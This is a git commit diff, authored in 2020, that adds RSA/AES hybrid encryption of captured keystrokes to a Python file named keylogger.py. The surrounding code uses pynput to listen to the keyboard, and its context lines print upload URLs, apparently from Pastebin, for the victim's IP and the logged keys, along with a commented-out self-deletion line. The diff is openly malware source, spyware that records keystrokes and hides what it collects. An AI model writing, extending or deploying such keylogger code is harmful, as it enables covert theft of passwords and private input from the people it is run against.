c87b39aed8ba6cc64cd2e3bd0bafa402a6ce0745
Sam <samsmith0817@gmail.com>
2020-05-02 15:38:34 -0400

    added RSA stuff to keylogger

--- keylogger.py
+++ keylogger.py
@@ -1,6 +1,9 @@
 from pynput.keyboard import Key, Listener
 import socket
 from pastebin import PastebinAPI
+from Crypto.PublicKey import RSA
+from Crypto.Random import get_random_bytes
+from Crypto.Cipher import AES, PKCS1_OAEP
 
 output = []
 
@@ -71,6 +74,23 @@ def main():
     print(ip_url.text)
     print(key_url.text)
     # remove(argv[0])
+
+    # encode output string in RSA (assumes key is in directory and stored as receiver.pem)
+    data = outstring.encode("utf-8")
+    file_out = open("encrypted_data_key.bin", "wb")  # writes to file for now
+
+    recipient_key = RSA.import_key(open("receiver.pem").read())
+    session_key = get_random_bytes(16)
+
+    # Encrypt the session key with the public RSA key
+    cipher_rsa = PKCS1_OAEP.new(recipient_key)
+    enc_session_key = cipher_rsa.encrypt(session_key)
+
+    # Encrypt the data with the AES session key
+    cipher_aes = AES.new(session_key, AES.MODE_EAX)
+    ciphertext, tag = cipher_aes.encrypt_and_digest(data)
+    [file_out.write(x) for x in (enc_session_key, cipher_aes.nonce, tag, ciphertext)]
+    file_out.close()
 
 
 if __name__ == "__main__":
